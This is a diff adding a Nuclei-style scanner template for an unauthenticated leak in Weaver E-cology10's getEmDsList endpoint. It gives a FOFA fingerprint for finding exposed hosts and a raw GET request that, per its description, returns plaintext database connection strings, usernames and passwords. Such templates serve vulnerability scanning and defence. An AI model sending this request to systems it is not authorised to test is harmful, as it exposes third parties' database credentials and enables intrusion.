@@ -1,0 +1,31 @@
+id: weaver-e-cology10-getemdslist-info-leak
+
+info:
+  name: "泛微 E-cology10 getEmDsList 接口未授权数据泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: icon_hash="-1619753057"
+    泛微 E-cology10 系统的 getEmDsList 接口因缺乏有效的身份认证机制，导致敏感数据暴露。攻击者无需授权即可通过构造恶意 GET 请求，直接获取系统中明文存储的数据库连接地址、账号及密码等关键凭证。该漏洞利用门槛极低，可能引发数据库远程登录、数据窃取及系统控制权丧失等严重后果，风险等级较高。
+  tags: 泛微
+
+http:
+- raw:
+  - |
+    GET /papi/em/transform/getEmDsList HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip
+    Connection: keep-alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+      - 'dsKey'
+      - 'deleteType'
+      - 'dsValue'
+      - 'dsDes'
+    condition: and
